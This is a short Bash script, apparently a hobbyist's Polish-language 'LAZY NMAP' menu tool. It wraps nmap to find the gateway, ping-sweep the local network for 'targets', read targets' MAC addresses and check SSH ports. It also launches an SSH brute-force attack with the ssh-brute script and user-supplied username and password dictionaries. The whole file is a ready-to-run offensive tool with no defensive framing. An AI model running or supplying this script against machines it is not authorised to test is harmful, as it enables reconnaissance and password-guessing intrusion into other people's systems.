#!/bin/bash


IP_brama="$(ip route | grep via | awk '{print$3}')"

#1
pokaz_ip_bramy()
{
	echo -e "\e[35m IP Twojej bramy to: \e[0m" $IP_brama && ./lazy_nmap.sh 
}
#2
pokaz_dostepne_cele()
{	

	echo -e "\e[35m Dostepne cele w Twojej sieci to: \e[0m"
	sudo nmap -sP $IP_brama/24 | grep '(1' | awk '{print$5$6}'  && ./lazy_nmap.sh  
}
#3
pokaz_adres_MAC()
{	
	echo -e "\e[35m Podaj IP celu \e[0m"
	read cel
	echo -e "\e[35m Adres MAC celu to: \e[0m"
	sudo nmap -sP -P $cel |grep MAC | awk '{print$3}' && ./lazy_nmap.sh  
  
}
#4
Pokaz_Port_ssh()
{
	echo -e "\e[35m Podaj IP celu \e[0m"
	read cel
	sudo nmap -p22 $cel  | grep 22/tcp  && ./lazy_nmap.sh
}

#5
SSH_Brute()
{
	echo -e "\e[35m Podaj IP celu \e[0m"
	read cel
	echo -e "\e[35m Podaj sciezke do slownika z loginami \e[0m" 
	read login
	echo -e "\e[35m Podaj sciezke do slownika z haslami \e[0m" 
	read haslo
	sudo nmap --script ssh-brute -p22 $cel --script-args userdb=$login,passdb=$haslo
	sudo ./lazy_nmap.sh
		
	
}




echo -e "\e[31m [---------L-A-Z-Y--N-M-A-P------BY-PRZEMO---V.1-0-----------------------------]\e[0m"
echo -e "\e[31m [1] - Pokaz IP Bramy w Twojej sieci \e[0m"
echo -e "\e[31m [2] - Pokaz dostepne cele - skanowanie pingiem \e[0m"
echo -e "\e[31m [3] - Pokaz adres MAC celu- skanowanie pingiem \e[0m"
echo -e "\e[31m [4] - Pokaz stan portu SSH \e[0m"
echo -e "\e[31m [5] - Wykonaj atak BruteForce SSH \e[0m"
echo -e "\e[31m [----------------------------------------------------------------------------] \e[0m"


read opcja
case "$opcja" in


  "1") pokaz_ip_bramy ;;
  "2") pokaz_dostepne_cele ;;
  "3") pokaz_adres_MAC ;;
  "4") Pokaz_Port_ssh ;;
  "5") SSH_Brute;;


  "11") exit ;;
  *)  ./lazy_nmap.sh
  
esac

 

